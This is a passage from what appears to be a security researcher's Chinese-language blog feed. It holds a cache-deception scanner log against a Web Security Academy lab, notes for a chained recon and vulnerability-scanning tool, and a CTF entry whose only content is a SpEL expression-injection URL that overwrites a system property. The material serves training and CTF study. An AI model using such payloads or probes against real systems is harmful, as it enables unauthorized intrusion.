href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post}aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post}aa</a><br>2025/10/23 20:46:00 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%7D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Daa</a><br>2025/10/23 20:46:00 [DEBUG] 正在测试分隔符 (来自字典): ‘~’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post~aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post~aa</a><br>2025/10/23 20:46:00 [DEBUG] 正在测试分隔符 (来自字典): ‘%21’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%21aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%21aa</a><br>2025/10/23 20:46:00 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2521’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2521aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2521aa</a><br>2025/10/23 20:46:00 [DEBUG] 正在测试分隔符 (来自字典): ‘%22’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%22aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%22aa</a><br>2025/10/23 20:46:00 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2522’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2522aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2522aa</a><br>2025/10/23 20:46:01 [DEBUG] 正在测试分隔符 (来自字典): ‘%23’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%23aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%23aa</a><br>2025/10/23 20:46:01 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2523’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2523aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2523aa</a><br>2025/10/23 20:46:01 [DEBUG] 正在测试分隔符 (来自字典): ‘%24’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%24aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%24aa</a><br>2025/10/23 20:46:01 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2524’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2524aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2524aa</a><br>2025/10/23 20:46:01 [DEBUG] 正在测试分隔符 (来自字典): ‘%25’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%25aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%25aa</a><br>2025/10/23 20:46:02 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2525’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2525aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2525aa</a><br>2025/10/23 20:46:02 [DEBUG] 正在测试分隔符 (来自字典): ‘%26’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%26aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%26aa</a><br>2025/10/23 20:46:02 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2526’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2526aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2526aa</a><br>2025/10/23 20:46:02 [DEBUG] 正在测试分隔符 (来自字典): ‘%27’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%27aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%27aa</a><br>2025/10/23 20:46:02 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2527’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2527aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2527aa</a><br>2025/10/23 20:46:03 [DEBUG] 正在测试分隔符 (来自字典): ‘%28’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%28aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%28aa</a><br>2025/10/23 20:46:03 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2528’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2528aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2528aa</a><br>2025/10/23 20:46:03 [DEBUG] 正在测试分隔符 (来自字典): ‘%29’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%29aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%29aa</a><br>2025/10/23 20:46:03 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2529’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2529aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2529aa</a><br>2025/10/23 20:46:03 [DEBUG] 正在测试分隔符 (来自字典): ‘%2A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Aaa</a><br>2025/10/23 20:46:04 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Aaa</a><br>2025/10/23 20:46:04 [DEBUG] 正在测试分隔符 (来自字典): ‘%2B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Baa</a><br>2025/10/23 20:46:04 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Baa</a><br>2025/10/23 20:46:04 [DEBUG] 正在测试分隔符 (来自字典): ‘%2C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Caa</a><br>2025/10/23 20:46:04 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Caa</a><br>2025/10/23 20:46:04 [DEBUG] 正在测试分隔符 (来自字典): ‘%2D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Daa</a><br>2025/10/23 20:46:05 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Daa</a><br>2025/10/23 20:46:05 [DEBUG] 正在测试分隔符 (来自字典): ‘%2E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Eaa</a><br>2025/10/23 20:46:05 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Eaa</a><br>2025/10/23 20:46:05 [DEBUG] 正在测试分隔符 (来自字典): ‘%2F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2Faa</a><br>2025/10/23 20:46:05 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%252F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%252Faa</a><br>2025/10/23 20:46:06 [DEBUG] 正在测试分隔符 (来自字典): ‘%3A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Aaa</a><br>2025/10/23 20:46:06 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253A’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Aaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Aaa</a><br>2025/10/23 20:46:06 [DEBUG] 正在测试分隔符 (来自字典): ‘%3B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Baa</a><br>2025/10/23 20:46:06 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Baa</a><br>2025/10/23 20:46:06 [DEBUG] 正在测试分隔符 (来自字典): ‘%3C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Caa</a><br>2025/10/23 20:46:06 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Caa</a><br>2025/10/23 20:46:07 [DEBUG] 正在测试分隔符 (来自字典): ‘%3D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Daa</a><br>2025/10/23 20:46:07 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Daa</a><br>2025/10/23 20:46:07 [DEBUG] 正在测试分隔符 (来自字典): ‘%3E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Eaa</a><br>2025/10/23 20:46:07 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Eaa</a><br>2025/10/23 20:46:07 [DEBUG] 正在测试分隔符 (来自字典): ‘%3F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%3Faa</a><br>2025/10/23 20:46:07 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%253F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%253Faa</a><br>2025/10/23 20:46:08 [DEBUG] 正在测试分隔符 (来自字典): ‘%40’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%40aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%40aa</a><br>2025/10/23 20:46:08 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2540’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2540aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2540aa</a><br>2025/10/23 20:46:08 [DEBUG] 正在测试分隔符 (来自字典): ‘%5B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Baa</a><br>2025/10/23 20:46:08 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Baa</a><br>2025/10/23 20:46:08 [DEBUG] 正在测试分隔符 (来自字典): ‘%5C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Caa</a><br>2025/10/23 20:46:09 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Caa</a><br>2025/10/23 20:46:09 [DEBUG] 正在测试分隔符 (来自字典): ‘%5D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Daa</a><br>2025/10/23 20:46:09 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Daa</a><br>2025/10/23 20:46:09 [DEBUG] 正在测试分隔符 (来自字典): ‘%5E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Eaa</a><br>2025/10/23 20:46:09 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Eaa</a><br>2025/10/23 20:46:09 [DEBUG] 正在测试分隔符 (来自字典): ‘%5F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%5Faa</a><br>2025/10/23 20:46:10 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%255F’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Faa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%255Faa</a><br>2025/10/23 20:46:10 [DEBUG] 正在测试分隔符 (来自字典): ‘%60’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%60aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%60aa</a><br>2025/10/23 20:46:10 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%2560’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2560aa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%2560aa</a><br>2025/10/23 20:46:10 [DEBUG] 正在测试分隔符 (来自字典): ‘%7B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Baa</a><br>2025/10/23 20:46:10 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257B’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Baa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Baa</a><br>2025/10/23 20:46:11 [DEBUG] 正在测试分隔符 (来自字典): ‘%7C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Caa</a><br>2025/10/23 20:46:11 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257C’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Caa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Caa</a><br>2025/10/23 20:46:11 [DEBUG] 正在测试分隔符 (来自字典): ‘%7D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Daa</a><br>2025/10/23 20:46:11 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257D’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Daa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Daa</a><br>2025/10/23 20:46:11 [DEBUG] 正在测试分隔符 (来自字典): ‘%7E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%7Eaa</a><br>2025/10/23 20:46:11 [DEBUG] 正在测试分隔符 (字典条目编码后): ‘%257E’, URL: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Eaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post%257Eaa</a><br>    [漏洞] 分隔符逻辑: 为URL <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a> 找到分隔符 (来自字典): ‘#’<br>    [漏洞] 分隔符逻辑: 为URL <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a> 找到分隔符 (来自字典): ‘?’<br>2025/10/23 20:46:12 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/aaaaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/aaaaa</a><br>2025/10/23 20:46:12 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/aaaaa">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/aaaaa</a><br>    [漏洞] 静态目录缓存: 检测到静态目录缓存 <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css</a> (X-Cache: hit)<br>    [信息] 规范化检查: Origin server normalization detected: <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css</a> and <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a/..%2fresources/css/labsBlog.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/a/..%2fresources/css/labsBlog.css</a> have the same content</p><p>[*] 正在进行漏洞分析…<br>    [高危] 潜在漏洞: 源服务器进行规范化，但缓存服务器未进行！</p><p>[*] 可缓存的URL:<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css</a> (X-Cache: hit)<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/labHeader.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/labHeader.js</a> (X-Cache: hit)<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/css/academyLabHeader.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/css/academyLabHeader.css</a> (X-Cache: hit)<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/submitSolution.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/submitSolution.js</a> (X-Cache: hit)<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/js/tracking.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/js/tracking.js</a> (X-Cache: hit)<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labs.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labs.css</a> (X-Cache: hit)</p><p>[*] 不可缓存的URL:<br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a><br>    <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a></p><p>[*] 扫描完成.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;爬虫模块。&quot;&gt;&lt;a href=&quot;#爬虫模块。&quot; class=&quot;headerlink&quot; title=&quot;爬虫模块。&quot;&gt;&lt;/a&gt;爬虫模块。&lt;/h1&gt;&lt;p&gt;使用ktana来进行url的主动爬取，深度要可选择，默认就2吧&lt;br&gt;使用gau来被动获取url&lt;br&gt;将获取的所有</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信息收集工具编写</title>
    <link href="https://lisien11.xyz/2025/10/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/"/>
    <id>https://lisien11.xyz/2025/10/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/</id>
    <published>2025-10-19T14:42:23.000Z</published>
    <updated>2025-10-24T01:35:20.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网上工具有很多-但是都没有串联-写个缝合怪"><a href="#网上工具有很多-但是都没有串联-写个缝合怪" class="headerlink" title="网上工具有很多.但是都没有串联,写个缝合怪"></a>网上工具有很多.但是都没有串联,写个缝合怪</h1><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><h2 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h2><p>subfinder</p><p>oneforall</p><p>合并去重subfinder和oneforall的域名存储到domain.txt</p><p>然后使用alterx来对域名进行变体探测</p><p>cat domain.txt | alterx | ksubdomain -verify -silent |tee res.txt<br>合并去重 domain.txt与res.txt<br>得到最终的domains.txt</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="top100-默认"><a href="#top100-默认" class="headerlink" title="top100 默认"></a>top100 默认</h3><p>使用naabu进行扫描top100</p><h2 id="url处理"><a href="#url处理" class="headerlink" title="url处理"></a>url处理</h2><p>naabu扫描完端口后使用httpx进行验证，并输出在项目的url文件夹下</p><h3 id="主动爬取"><a href="#主动爬取" class="headerlink" title="主动爬取"></a>主动爬取</h3><p>将获取的url使用ktana进行主动爬取，然后传给hakrawler，输出在url文件夹下</p><h3 id="被动爬取"><a href="#被动爬取" class="headerlink" title="被动爬取"></a>被动爬取</h3><p>使用gau<br>xscan存在主动与被动，主动爬取的url传入xscan，输出其主动和gau被动爬取的值。<br>所有扫描结束后将值</p><h3 id="url去重"><a href="#url去重" class="headerlink" title="url去重"></a>url去重</h3><p>主动爬取的url结果经过urldedupe处理 -s 处理</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>nuclei(内存占用也大，采用10000，10000行的形式会好很多)</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>扫描时使用脚本讲url分为10000行10000行的进行扫描以减少内存消耗防止劫持被kill<br>在扫描好一个文件后删除这个临时文件</p><h3 id="子域名接管"><a href="#子域名接管" class="headerlink" title="子域名接管"></a>子域名接管</h3><p>这个在讲域名收集好后进行探测</p><h3 id="自己写的脚本"><a href="#自己写的脚本" class="headerlink" title="自己写的脚本"></a>自己写的脚本</h3><p>8.使用gf提取易ssrf估计的url，轮换每个参数为反连域名的url，给httpx访问同时开启302跳转来测试url跳转漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网上工具有很多-但是都没有串联-写个缝合怪&quot;&gt;&lt;a href=&quot;#网上工具有很多-但是都没有串联-写个缝合怪&quot; class=&quot;headerlink&quot; title=&quot;网上工具有很多.但是都没有串联,写个缝合怪&quot;&gt;&lt;/a&gt;网上工具有很多.但是都没有串联,写个缝合怪&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>强网</title>
    <link href="https://lisien11.xyz/2025/10/18/%E5%BC%BA%E7%BD%91/"/>
    <id>https://lisien11.xyz/2025/10/18/%E5%BC%BA%E7%BD%91/</id>
    <published>2025-10-18T11:46:51.000Z</published>
    <updated>2025-10-18T11:47:07.221Z</updated>
    
    <content type="html"><![CDATA[<img src="/2025/10/18/%E5%BC%BA%E7%BD%91/IMG_20251018-194702351.png" class="">  <p><a href="https://eci-2ze5i7cbu6fsrcnhkfnv.cloudeci1.ichunqiu.com:8080/check?rule=%23%7B%23systemProperties%5B&#39;user.home&#39;%5D=%22/tmp/%22%7D">https://eci-2ze5i7cbu6fsrcnhkfnv.cloudeci1.ichunqiu.com:8080/check?rule=%23%7B%23systemProperties%5B&#39;user.home&#39;%5D=%22/tmp/%22%7D</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2025/10/18/%E5%BC%BA%E7%BD%91/IMG_20251018-194702351.png&quot; class=&quot;&quot;&gt;  
&lt;p&gt;&lt;a href=&quot;https://eci-2ze5i7cbu6fsrcnhkfnv.cloudeci1.ichu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>chacklist</title>
    <link href="https://lisien11.xyz/2025/10/13/chacklist/"/>
    <id>https://lisien11.xyz/2025/10/13/chacklist/</id>
    <published>2025-10-13T10:30:39.000Z</published>
    <updated>2025-10-14T11:36:18.375Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="65ef26c57f31a8afc3ca78425e2a3ecb77527716f6ba60b6a83dbcb2c41ee8cc">aa4d0537ff612e50e47a231e796e4a1f0515937c555566258a32aae013c98db13600992ddb8390b32a555b79c8c93980c101f3c72cd335852f8ada49a2e3a48344f1110546c53d55d7f2ce7a0f94b7c51de710e26ba42d3d808c41046c309c3d4e8496061ccc51225e2d696a76a6428af7b9214b7a6866bbb75e828f66cb8e590ea3890f7726117b6b795c418f385d2b82eed3dab27bc07b89080bbb4873be248add2177ce5d813fc29f40b4a46638d60242281a8d4b8f1ff2706bd7c6aeaa5721874292c2b1b4ce46762fd6832ae2d329253ea7346ec9af46c5ddc747085654577697a1eb3f22d7f1e426ea09cc4451d037804bb4232691f77ddec29068fdbddfac3d0114bf20e5178f0ff7ce001d3d72bcc72ba5acc2be62676d47000f7a015c2a166a39250bfe454000e6d0d0927738caa0f6ebad171d1d5dc9608f6a7863cbb24fa221ddcc2ed615ce1a8ca61810f7079cbb9340b15605d486745b51c81a5ac20252a39a21785eafa3d837584d531875ce4e290265372d982674168c7d5eb1e90eb83a0a1d71f2e243c86a042e9bf903996fa1683ebf4c4c1907cba1b5cc2188f32e3301cd3bff137d4a4e16dd04268a0595d809cb88eedd05252e60b20eec2609ff6b11f2822ee77d76d31688a385fecb15192add4d3f7924976dc80593766767404b14682414823de657360b72af31dd6a2ac3f813212387ae2efef72b78f1c7d1b0089f8760f7486cfd26c2b48e79fc70e848492d19be165590e9c58b22b06f9bdab4f650bc64191cbf00c79b5981ea9ffd86b17607401fa513e5a27dde710a1a84016acbb8b3f37ec9620bc0b917657fc778eef16a6fb52d27e30d672ecfecbce8cfa717722f49be8c80b066e73b8492ea5f6060caf5e9b0094b7738ccd07842ee8356af0dc82170152bef598aa6915dbcdefb8db5efda743593b9e5492b433cb466685b85fd44370055535efd66135efd2b0c44716e7fdc5d0086fc1c2767fb6896d4244fb16fd899bc6cbac8ac374c9d62838145623a66678095e9e059ffa8da4ee1919f78a3ea9bd349fc78edc3c937e70229c1bbd97d7eb7cf37c006cbdee7959cf33134ffd96cd1ac5cda2b3ccd2f26e44c748677f92df15c766a952242c599a87902640b064130b1eade61790d484735ea7c199b8ffdd2bc94f3a11022771419c3fc22b9e0fbeb4b50b932b66f7c459b1d5bd9fa905334e14a4e735ff9d18ec785508f82510cee40e993df2ba7e538a55d634e03cfced05d23b1b8afcb